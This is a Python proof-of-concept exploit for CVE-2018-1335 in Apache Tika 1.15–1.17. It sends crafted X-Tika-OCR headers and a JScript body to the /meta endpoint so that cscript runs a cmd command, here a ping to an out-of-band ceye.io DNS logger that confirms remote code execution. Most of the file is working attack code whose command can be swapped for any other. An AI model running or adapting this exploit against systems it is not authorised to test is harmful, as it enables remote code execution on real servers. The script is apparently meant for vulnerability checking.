#!/usr/bin/env python3
#@author: badger
#@date: 2019-10-17
#
import requests
import time
import sys

class PoC(object):
    name = "Apache Tika Header Command Injection"
    appName = "Apache Tika"
    appManu = "Apache Software Foundation"
    appVersion = "1.15 - 1.17"
    updateDate = "2019-10-17"
    Platform = "Windows"
    vulRefer = "CVE-2018-1335"

    def __init__(self, host, port, identifier, token):
        self.host = str(host)
        self.port = str(port)
        self.cmd = "ping CVE-2018-1335.{}".format(identifier)
        self.token = token

    def _pushdata(self):

        veri_url = self.host + ':' + self.port + "/meta"
        headers = {"X-Tika-OCRTesseractPath": "\"cscript\"", 
                "X-Tika-OCRLanguage": "//E:Jscript", 
                "Expect": "100-continue", 
                "Content-type": "image/jp2", 
                "Connection": "close"}
        jscript='''var oShell = WScript.CreateObject("WScript.Shell");
        var oExec = oShell.Exec('cmd /c {}');
        '''.format(self.cmd)
        try:
            requests.put("https://"+veri_url, headers=headers, data=jscript, verify=False)
        except Exception as e:
            try:
                # print(e)
                requests.put("http://"+veri_url, headers=headers, data=jscript)
            except Exception as e:
                # print(e)
                print("Something went wrong.\nUsage: python CVE-2018-1335.py <host> <port> <ceye_identifier> <ceye_token>")

    def _check(self):
        self._pushdata()
        time.sleep(2)
        check_url = "http://api.ceye.io/v1/records?token={}&type=dns&filter=CVE-2018-1335".format(self.token)
        res = requests.get(url=check_url)
        if "CVE-2018-1335" in res.text:
            print("The target is vulnerable to {}.".format(self.vulRefer))
            return True
        else:
            print("The target seem not vulnerable to {}".format(self.vulRefer))
            return False

if __name__ == '__main__':
    try:
        host = sys.argv[1]
        port = sys.argv[2]
        identifier = sys.argv[3]
        token = sys.argv[4]
    except Exception as e:
        print("Usage: python CVE-2018-1335.py <host> <port> <ceye_identifier> <ceye_token>")
        print("Example: python CVE-2018-1335.py localhost 9998 abcdef.ceye.io abcdefghijklmn")
    poc = PoC(host, port, identifier, token)
    poc._check()
